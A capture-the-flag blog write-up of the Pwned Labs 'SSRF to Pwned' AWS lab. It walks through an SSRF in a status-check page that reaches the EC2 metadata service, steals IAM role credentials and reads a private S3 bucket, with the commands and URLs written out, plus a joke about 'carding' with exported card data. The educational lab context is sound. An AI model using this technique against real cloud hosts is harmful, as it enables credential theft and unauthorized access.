---
title: "Pwned Labs - SSRF to Pwned"
date: 2024-02-04
categories: [AWS, Cloud, Security]
tags: [AWS, Security, EC2]
---

![Intro](/images/PwnedLabs/SSRF/8.png)

Hey everyone! It's time for another AWS Security challenge write-up. This time, we will be solving the [SSRF to Pwned](https://pwnedlabs.io/labs/ssrf-to-pwned) challenge. When we begin the lab, we are provided by an IP address as an entry point so let's start with that.

A Nmap scan reveals port 80 is open, so let's explore what's running there. Also, observe that the nmap also returned `ec2-52-6-119-121.compute-1.amazonaws.com` which indicates that this is a IP of an EC2 server.
```
nmap 52.6.119.121
Nmap scan report for ec2-52-6-119-121.compute-1.amazonaws.com (52.6.119.121)                                            
Host is up (0.21s latency).                                                                                             
Not shown: 998 filtered ports                                                                                           
PORT    STATE  SERVICE                                                                                                  
80/tcp  open   http                                                                                                     
443/tcp closed https
```

When I tried to open the IP in the browser, it redirects to `hugelogistics.pwn`.  We first need to add the following entry in our hosts file then we can browse the website in our browser. I added the following entry in the `C:\Windows\System32\drivers\etc\hosts` file. In case of Linux systems, you can add the entry in `/etc/hosts` file. 
```
52.6.119.121 hugelogistics.pwn
```
Now, when we load the site `hugelogistics.pwn` in our browser, we see the following site. 

![Intro](/images/PwnedLabs/SSRF/0.png)

While looking at the source code of the website, we can notice that this static website is hosted using S3 bucket hosting, and the bucket name is `huge-logistics-storage`. 

![Intro](/images/PwnedLabs/SSRF/source.png)

We can observe that the bucket is publicly accessible, and contains the flag in the `backup` folder. But, we do not have permission to read the `flag.txt`. 
```
$ aws s3 ls s3://huge-logistics-storage --no-sign-request
                           PRE backup/
                           PRE web/

$ aws s3 ls s3://huge-logistics-storage/backup/ --no-sign-request
2023-06-01 03:44:05          0
2023-06-01 03:44:47       3717 cc-export2.txt
2023-06-01 20:08:27         32 flag.txt

$ aws s3 cp s3://huge-logistics-storage/backup/flag.txt - --no-sign-request
download failed: s3://huge-logistics-storage/backup/flag.txt to - An error occurred (403) when calling the HeadObject operation: Forbidden
```
Switching back to my browser, I started exploring the site and found a Status Check functionality, this functionality passes a parameter called "name" with the value `hugelogisticstatus.pwn`. The response is the Status Page as shown below. The first thing that comes to mind when you see this kind of functionality is SSRF.

![Intro](/images/PwnedLabs/SSRF/1.png)

So, without taking more time, I quickly passed the Instance Meta-data Service (IMDS) IP `http://169.254.169.254` to the name parameter. We can notice in the response, we are getting the data.

> There have been numerous cloud data breaches caused because an attacker was able to get the Role credentials attached to EC2 instances by exploiting vulnerabilities such as SSRF or RCE. This occurs because when exploiting a vulnerability like SSRF, an attacker can send requests to internal infrastructure. Each EC2 instance has a service called Instance Meta-data service (IMDS) attached to it. The Instance Metadata Service (IMDS) in AWS is a service that provides information about an Amazon Elastic Compute Cloud (EC2) instance, accessible at 169.254.169.254. It enables EC2 instances to retrieve metadata about themselves,
such as instance ID, IP address, security group information, and most importantly, the IAM credentials provided to the instance via the EC2 Instance Profile Role.\
You can obtain the temporary AWS credentials by sending a request to : 
`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<instance-role>`\
If an application running on an EC2 instance was vulnerable to SSRF attacks, attackers could exploit the vulnerability to exfiltrate the IAM credentials through the IMDSv1 endpoint, which are granted to the instance via IAM Instance Profile Role. With the stolen temporary security credentials, attackers could escalate their privileges and gain unauthorized access to other AWS resources, including S3 buckets, databases, or launch further attacks within the victim’s environment.\ 
To enhance security for the IMDS endpoint, AWS introduced IMDSv2, implementing a small yet crucial change in the way IMDS was accessed. Instead of allowing access without authentication, IMDSv2 enforces the fetching of a token that is then used to authenticate all requests made to the IMDS endpoint. This measure significantly reduces the risk of unauthorized access through SSRF vulnerabilities.
And, if in any scenario an attacker is able to extract these temporary credentials, AWS GuardDuty (if enabled) sends an alert notifying you about the incident. For example, below two alerts:
> - UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.InsideAWS
> - UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS\
> InsideAWS : If an attacker manages to retrieve temporary credentials from your server and exports them to their own EC2 instance for further use, AWS GuardDuty will raise an alert, notifying you that someone is utilizing your credentials from within the AWS netowrk.\
OutsideAWS : If an attacker manages to retrieve temporary credentials from your server and exports them in the terminal of their system for further use, AWS GuardDuty will raise an alert, notifying you that someone is utilizing your credentials from outside the AWS network.

![Intro](/images/PwnedLabs/SSRF/2.png)

We were able to successfully obtain the temporary credentials by opening `http://hugelogistics.pwn/status/status.php?name=169.254.169.254/latest/meta-data/iam/security-credentials/MetapwnedS3Access`, here you should note that the role attached to the EC2 server is "MetapwnedS3Access".

![Intro](/images/PwnedLabs/SSRF/3.png)

We know once we get the AWS Credentials, our next step is to configure them into our AWS profile. But, this time we also have a token alongside AWS Access Key and Secret Key, we can configure those as shown below.

![Intro](/images/PwnedLabs/SSRF/5.png)

Or you can also export these credentials into your environment variables to use them further. 
```
$ export AWS_ACCESS_KEY_ID=key
$ export AWS_SECRET_ACCESS_KEY=key
$ export AWS_SESSION_TOKEN=token
```
We can observe that we have assumed the role MetapwnedS3Access, along with the EC2 instance id `i-0199bf97fb9d996f1` the role is attached to. This command below is basically `whoami` command in context of AWS.

```
$ aws sts get-caller-identity --profile ssrf
{
    "UserId": "AROARQVIRZ4UCHIUOGHDS:i-0199bf97fb9d996f1",
    "Account": "104506445608",
    "Arn": "arn:aws:sts::104506445608:assumed-role/MetapwnedS3Access/i-0199bf97fb9d996f1"
}
```
Now, we have everything configured and working, so let us try to list the bucket objects with the recently obtained credentials. 

```
$ aws s3 ls huge-logistics-storage --profile ssrf
                           PRE backup/
                           PRE web/

$ aws s3 ls s3://huge-logistics-storage/backup/ --profile ssrf
2023-06-01 03:44:05          0
2023-06-01 03:44:47       3717 cc-export2.txt
2023-06-01 20:08:27         32 flag.txt
```
We notice a file called `cc-export2.txt`, which contains data of bunch of credit card. We will use them for carding later /s.  

![Intro](/images/PwnedLabs/SSRF/7.png)

Let's obtain the flag and finish the challenge.
```
$ aws s3 cp s3://huge-logistics-storage/backup/flag.txt - --profile ssrf
282f0[.............]7110
```

## Lessons Learned
1. Do not keep your confidential data in public buckets.
2. Assign proper permissions on the buckets and objects defining who can access your data, keeping in mind the Least privilege policy model.
3. Migrate all your previous EC2, ECS, EKS instances to IMDSv2 service.
4. With the latest announcement in the last re:Invent, all the new EC2 instances will be on IMDSv2 by default, but you should write a SCP to make sure nobody can change the configuration back to IMDSv1.  